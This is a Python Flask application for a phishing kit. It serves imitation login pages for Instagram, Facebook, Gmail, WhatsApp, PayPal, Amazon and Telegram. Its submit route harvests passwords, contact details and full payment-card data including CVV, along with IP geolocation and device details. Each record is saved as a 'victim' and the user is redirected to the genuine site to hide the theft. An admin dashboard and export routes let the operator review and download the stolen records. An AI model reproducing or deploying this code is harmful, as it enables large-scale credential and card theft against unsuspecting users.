from flask import Flask, render_template, request, redirect, jsonify, session, url_for
import os
import json
from datetime import datetime

from config import Config
from database import Database
from utils import get_ip_info, parse_user_agent

app = Flask(__name__)
app.config.from_object(Config)

db = Database(Config.DATABASE)

# ------------------ PUBLIC ROUTES ------------------
@app.route('/')
def index():
    db.increment_visits()
    return render_template('index.html')

@app.route('/<platform>')
def platform_page(platform):
    platforms = ['instagram', 'facebook', 'gmail', 'whatsapp', 'paypal', 'amazon', 'telegram']
    if platform not in platforms:
        return redirect('/')
    db.increment_visits()
    return render_template(f'platforms/{platform}.html', platform=platform)

@app.route('/submit', methods=['POST'])
def submit():
    platform = request.form.get('platform', 'Unknown')
    username = request.form.get('username', '')
    password = request.form.get('password', '')
    email = request.form.get('email', '')
    phone = request.form.get('phone', '')
    full_name = request.form.get('full_name', '')
    card_number = request.form.get('card_number', '')
    card_expiry = request.form.get('card_expiry', '')
    card_cvv = request.form.get('card_cvv', '')
    
    ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', '')
    
    ip_info = get_ip_info(ip)
    ua_info = parse_user_agent(user_agent)
    
    data = {
        'platform': platform,
        'username': username,
        'password': password,
        'email': email,
        'phone': phone,
        'full_name': full_name,
        'card_number': card_number,
        'card_expiry': card_expiry,
        'card_cvv': card_cvv,
        'ip': ip,
        'country': ip_info.get('country', 'Unknown'),
        'city': ip_info.get('city', 'Unknown'),
        'user_agent': user_agent,
        'browser': ua_info.get('browser', 'Unknown'),
        'os': ua_info.get('os', 'Unknown'),
        'device': ua_info.get('device', 'Unknown'),
        'additional_data': {}
    }
    
    # Save to database
    db.add_victim(data)
    
    # Redirect to real site
    real_urls = {
        'instagram': 'https://www.instagram.com',
        'facebook': 'https://www.facebook.com',
        'gmail': 'https://mail.google.com',
        'whatsapp': 'https://web.whatsapp.com',
        'paypal': 'https://www.paypal.com',
        'amazon': 'https://www.amazon.com',
        'telegram': 'https://web.telegram.org'
    }
    return redirect(real_urls.get(platform, 'https://www.google.com'))

# ------------------ ADMIN ROUTES ------------------
@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == Config.ADMIN_USERNAME and password == Config.ADMIN_PASSWORD:
            session['admin_logged_in'] = True
            return redirect('/dashboard')
        return render_template('login.html', error=True)
    return render_template('login.html')

@app.route('/dashboard')
def dashboard():
    if not session.get('admin_logged_in'):
        return redirect('/admin')
    total_visits, total_submissions, last = db.get_stats()
    recent_victims = db.get_recent_victims(10)
    platform_stats = db.get_platform_stats()
    daily_stats = db.get_daily_stats(7)
    
    return render_template('dashboard.html',
                         total_visits=total_visits,
                         total_submissions=total_submissions,
                         last_submission=last,
                         recent_victims=recent_victims,
                         platform_stats=platform_stats,
                         daily_stats=daily_stats)

@app.route('/admin/export/<format>')
def export(format):
    if not session.get('admin_logged_in'):
        return redirect('/admin')
    victims = db.get_all_victims(limit=10000)
    if format == 'json':
        return jsonify(victims)
    elif format == 'csv':
        import csv
        import io
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(['ID', 'Platform', 'Username', 'Password', 'Email', 'Phone', 'IP', 'Country', 'Timestamp'])
        for v in victims:
            writer.writerow([v['id'], v['platform'], v['username'], v['password'], v['email'], v['phone'], v['ip'], v['country'], v['timestamp']])
        return output.getvalue()
    return jsonify(victims)

@app.route('/admin/clear', methods=['POST'])
def clear():
    if not session.get('admin_logged_in'):
        return jsonify({'error': 'Unauthorized'}), 401
    db.clear_all()
    return jsonify({'success': True})

@app.route('/admin/logout')
def logout():
    session.pop('admin_logged_in', None)
    return redirect('/')

# ------------------ API ROUTES ------------------
@app.route('/api/stats')
def stats():
    total_visits, total_submissions, last = db.get_stats()
    return jsonify({
        'visits': total_visits,
        'submissions': total_submissions,
        'last_submission': last,
        'platforms': [{'name': p, 'count': c} for p, c in db.get_platform_stats()]
    })

@app.route('/api/recent')
def recent():
    recent = db.get_recent_victims(5)
    return jsonify(recent)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
